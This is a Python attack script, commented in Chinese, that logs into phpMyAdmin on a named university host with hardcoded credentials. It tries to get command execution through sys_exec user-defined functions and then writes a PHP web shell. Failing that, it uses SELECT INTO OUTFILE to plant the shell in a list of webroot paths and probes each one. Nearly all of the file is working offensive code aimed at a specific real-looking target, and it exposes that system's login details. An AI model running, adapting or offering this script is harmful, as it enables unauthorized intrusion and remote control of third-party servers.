#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 终极方法：通过phpMyAdmin的SQL执行，直接执行命令
print("[*] 尝试直接执行系统命令...")

# 检查是否有sys_exec或sys_eval函数
sql_check = "SELECT * FROM mysql.func WHERE name='sys_exec' OR name='sys_eval';"
sql_data = {"sql_query": sql_check, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

if "sys_exec" in resp.text or "sys_eval" in resp.text:
    print("[+] 发现sys_exec/sys_eval函数!")
    # 执行命令
    sql = "SELECT sys_exec('id');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    if "uid=" in resp.text:
        print("[+] 命令执行成功!")
        # 写入shell
        sql = "SELECT sys_exec('echo \"<?php system(\\$_GET[c]); ?>\" > /var/www/html/enmeeting/shell.php');"
        sql_data = {"sql_query": sql, "db": "mysql"}
        session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
        
        time.sleep(1)
        test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
        if "uid=" in test_shell.text:
            print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
            exit(0)

# 方法：通过phpMyAdmin的SQL执行，写入到所有可能的路径
print("[*] 尝试所有可能的写入路径...")
all_paths = [
    "/var/www/html/enmeeting/shell.php",
    "/var/www/html/shell.php",
    "/var/www/enmeeting/shell.php",
    "/var/www/shell.php",
    "/home/www/html/shell.php",
    "/usr/share/nginx/html/shell.php",
    "/opt/lampp/htdocs/shell.php",
    "/var/www/html/banpot/scmeeting/shell.php",
]

for write_path in all_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{write_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 检查响应中是否有错误
    if "error" not in resp.text.lower() or "access denied" not in resp.text.lower():
        time.sleep(1)
        http_path = write_path.replace("/var/www/html", "").replace("/var/www", "").replace("/home/www/html", "").replace("/usr/share/nginx/html", "").replace("/opt/lampp/htdocs", "")
        test_url = f"https://olympic.su.ac.th{http_path}?c=id"
        test_resp = requests.get(test_url, verify=False, timeout=5)
        if "uid=" in test_resp.text:
            print(f"[+] Shell获取成功: {test_url}")
            exit(0)

print("[-] 所有方法尝试完毕")
